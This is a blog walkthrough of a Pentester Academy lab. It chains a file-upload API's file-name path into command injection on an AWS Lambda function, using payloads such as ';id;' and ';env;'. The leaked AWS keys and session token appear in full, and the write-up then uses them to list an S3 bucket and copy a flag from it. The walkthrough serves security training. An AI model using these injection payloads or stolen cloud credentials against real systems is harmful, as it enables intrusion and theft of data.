---
title: "From File Upload to Command Injection to Aws Compromise"
date: 2022-04-24T22:24:43+05:30
draft: false
---

> Hey everyone, hope you all are doing good. This will be a short walkthrough for the Command Injection-2282 Lab by Pentester Academy.
> 
> Lab Link: [https://attackdefense.pentesteracademy.com/challengedetails?cid=2282](https://attackdefense.pentesteracademy.com/challengedetails?cid=2282)

## Intro

We are given a URL to a webapp [https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod](https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod). It allows us to upload files.

Upload a file by drag and drop and intercept the request with a proxy such as Burpsuite. The file upload request & response looks like the following:

## Request
```http
POST /Prod/api/file/file.txt HTTP/2
Host: cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod
Content-Type: image/svg+xml
Origin: https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com
Content-Length: 11
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Hello world
```
## Response
```http
HTTP/2 500 Internal Server Error
Content-Type: application/json
Content-Length: 83
Date: Sun, 24 Apr 2022 00:36:24 GMT
X-Amzn-Requestid: d923b04a-fe3b-4ba7-a2b3-090b13b99a1a
X-Amz-Apigw-Id: RD09TE5dSQ0FneA=
X-Amzn-Trace-Id: Root=1-62649b88-6340e2b4699877f17f1bc9f7;Sampled=0
X-Cache: Error from cloudfront
Via: 1.1 a8c89565e6a461b7f4de5fc565b8ea9c.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: CCU50-C1
X-Amz-Cf-Id: FEkfsynkmb95fLyND1UnGbQbTOEGR3v-w1aV-fCsQSDMo2F9xGqhLg==

{
	"message":"Error putting object: temporary-public-image-store:2022-04-24-file.txt"
}
```
If you look closely enough, the request contains the file name in the path `/Prod/api/file/file.txt` where our file name is `file.txt`.

As the Lab name suggests **Command Injection**, we will check for command injection. The file name parameter looks promising. Let us include a simple command injection payload of `;id;` after the file name in the above request. Here is the curl command for the request:
```bash
curl -s -X POST --data 'Hello world' 'https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod/api/file/file.txt;id;'
```
Response:
```json
{"message":"Error putting object: temporary-public-image-store:2022-04-24-file.txt uid=993(sbx_user1051) gid=990 groups=990" }
```
We can confirm that there is indeed command injection. We can now print the environment variables by using the `env` command.
```bash
curl -s -X POST --data 'https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod/api/file/file.txt;env;'
```
Response:
```json
{"message":"Error putting object: temporary-public-image-store:2022-04-24-file.txt
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELH//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAO4xbz7zKVuasbHEXOmKsiu1GKBz1Hp35EIvuD0C25uMAiAdnevrWndwsZRz5zKi5a96Fon6vfFjA/+cDjYBtW9aByq4AghqEAEaDDI3NjM4NDY1NzcyMiIMJgLGEps7zWMGjVwQKpUC5LHpcU2AEZXqB07bah71yHR0cjgyTV3+s/gf5JCCGhGu8VKO5YZQ2q02cCJhC+rFvk7BRIEJjT3PBo8w34FaF5D4rBJsCqPUfR3fYOA/bk6pKMJB+3qPEV4OOHHV495Nw9YWoYY3yrCtVw+wXy634RmqANfmcomDPpSMggXY6xCE+ocZkhRR+tR8o99keiNAkP+ZPv5hEcZZNtI0LROkb/132B1k5LRyJLJnvowlz5zS9GPbFfSfAc8VuDoT2F30KcpWGF9KAvmzdYt7W1ypoAS2hyegaGrdlDd+OHBx5lyKIQnRsTBwCjzk7rr/M40gUxxZj5y2/3awM1aWnwfcQP38JeyHrJ3NmRa5LuNdOqJSjpOFTTD3upKTBjqaASeEo/xqlnjOikFaIIldkFkSSb00l4jOk7Fd8K5XzmTytRERkRbZiG4Hb/Th0BvJ7k/F9vFcAYdJeokh6IPHQSbDqn1o5xR7W36T8+4Ww9ZNGeApFRBdnauwSnbbg+qF0M9M+WXcj8kjPzu98G2zTFAQMJusCpGHKIiWfS8n1NxZwwi5oRnx6E5t4eivoFjQMELFR2gYX335wA4=
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/serverlessrepo-image-uploader-uploader-RM72CSUT4KDA
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_STREAM_NAME=2022/04/24/[$LATEST]3991f624aa564a9faf16391b4d665e4c
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_EXECUTION_ENV=AWS_Lambda_nodejs12.x
DEST_BUCKET=temporary-public-image-store
AWS_LAMBDA_FUNCTION_NAME=serverlessrepo-image-uploader-uploader-RM72CSUT4KDA
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=ap-southeast-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=Zh0QhdXOdG0iHU7tmOAxqNBYJynvYVfkP8j0Ywre
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
TZ=:UTC
AWS_REGION=ap-southeast-1
NODE_PATH=/opt/nodejs/node12/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task
AWS_ACCESS_KEY_ID=ASIAUAWOPGE5F3QFUGM2
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
_X_AMZN_TRACE_ID=Root=1-62649eba-3938f0313d1806a00ed712fa;Parent=5138042068187b72;Sampled=0
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=src/index.handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1536
NODE_EXTRA_CA_CERTS=/etc/pki/tls/certs/ca-bundle.crt
_=/usr/bin/env"
}
```
Great! We have just got a few interesting environment variables:
```json
{
"AWS_ACCESS_KEY_ID": "ASIAUAWOPGE5F3QFUGM2",
"AWS_SECRET_ACCESS_KEY": "Zh0QhdXOdG0iHU7tmOAxqNBYJynvYVfkP8j0Ywre",
"DEST_BUCKET": "temporary-public-image-store".
"AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjELH//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAO4xbz7zKVuasbHEXOmKsiu1GKBz1Hp35EIvuD0C25uMAiAdnevrWndwsZRz5zKi5a96Fon6vfFjA/+cDjYBtW9aByq4AghqEAEaDDI3NjM4NDY1NzcyMiIMJgLGEps7zWMGjVwQKpUC5LHpcU2AEZXqB07bah71yHR0cjgyTV3+s/gf5JCCGhGu8VKO5YZQ2q02cCJhC+rFvk7BRIEJjT3PBo8w34FaF5D4rBJsCqPUfR3fYOA/bk6pKMJB+3qPEV4OOHHV495Nw9YWoYY3yrCtVw+wXy634RmqANfmcomDPpSMggXY6xCE+ocZkhRR+tR8o99keiNAkP+ZPv5hEcZZNtI0LROkb/132B1k5LRyJLJnvowlz5zS9GPbFfSfAc8VuDoT2F30KcpWGF9KAvmzdYt7W1ypoAS2hyegaGrdlDd+OHBx5lyKIQnRsTBwCjzk7rr/M40gUxxZj5y2/3awM1aWnwfcQP38JeyHrJ3NmRa5LuNdOqJSjpOFTTD3upKTBjqaASeEo/xqlnjOikFaIIldkFkSSb00l4jOk7Fd8K5XzmTytRERkRbZiG4Hb/Th0BvJ7k/F9vFcAYdJeokh6IPHQSbDqn1o5xR7W36T8+4Ww9ZNGeApFRBdnauwSnbbg+qF0M9M+WXcj8kjPzu98G2zTFAQMJusCpGHKIiWfS8n1NxZwwi5oRnx6E5t4eivoFjQMELFR2gYX335wA4="
}
```

To be able to use these credentials, we first need to install the AWS CLI tool `aws-cli`.
```bash
sudo apt install aws-cli
```
Now, export the variables:
```bash
export AWS_ACCESS_KEY_ID=ASIAUAWOPGE5F3QFUGM2
export AWS_SECRET_ACCESS_KEY=Zh0QhdXOdG0iHU7tmOAxqNBYJynvYVfkP8j0Ywre
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELH//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAO4xbz7zKVuasbHEXOmKsiu1GKBz1Hp35EIvuD0C25uMAiAdnevrWndwsZRz5zKi5a96Fon6vfFjA/+cDjYBtW9aByq4AghqEAEaDDI3NjM4NDY1NzcyMiIMJgLGEps7zWMGjVwQKpUC5LHpcU2AEZXqB07bah71yHR0cjgyTV3+s/gf5JCCGhGu8VKO5YZQ2q02cCJhC+rFvk7BRIEJjT3PBo8w34FaF5D4rBJsCqPUfR3fYOA/bk6pKMJB+3qPEV4OOHHV495Nw9YWoYY3yrCtVw+wXy634RmqANfmcomDPpSMggXY6xCE+ocZkhRR+tR8o99keiNAkP+ZPv5hEcZZNtI0LROkb/132B1k5LRyJLJnvowlz5zS9GPbFfSfAc8VuDoT2F30KcpWGF9KAvmzdYt7W1ypoAS2hyegaGrdlDd+OHBx5lyKIQnRsTBwCjzk7rr/M40gUxxZj5y2/3awM1aWnwfcQP38JeyHrJ3NmRa5LuNdOqJSjpOFTTD3upKTBjqaASeEo/xqlnjOikFaIIldkFkSSb00l4jOk7Fd8K5XzmTytRERkRbZiG4Hb/Th0BvJ7k/F9vFcAYdJeokh6IPHQSbDqn1o5xR7W36T8+4Ww9ZNGeApFRBdnauwSnbbg+qF0M9M+WXcj8kjPzu98G2zTFAQMJusCpGHKIiWfS8n1NxZwwi5oRnx6E5t4eivoFjQMELFR2gYX335wA4=
```
Now let’s view the contents of the bucket:
```sh
root@attackdefense:~ aws s3 ls temporary-public-image-store 2020-10-30 04:24:16 39 flag.txt
```
It contains our flag.txt file. Let’s download it to our local machine.
```sh
root@attackdefense:~ aws s3 cp s3://temporary-public-image-store/flag.txt ./flag.txt download: s3://temporary-public-image-store/flag.txt to ./flag.txt
```
![](/images/img-from-file-upload-to-command-injection-to-aws-compromise-0.png)

As shown above, we have abused the file upload feature and escalated it to a Remote Code Execution. From there, we got access to stored credentials for AWS in the environment variables and got access to sensitive file stored in the s3 bucket.


> Originally written on https://manash01.medium.com/from-file-upload-to-command-injection-to-aws-compromise-e937271bff2e
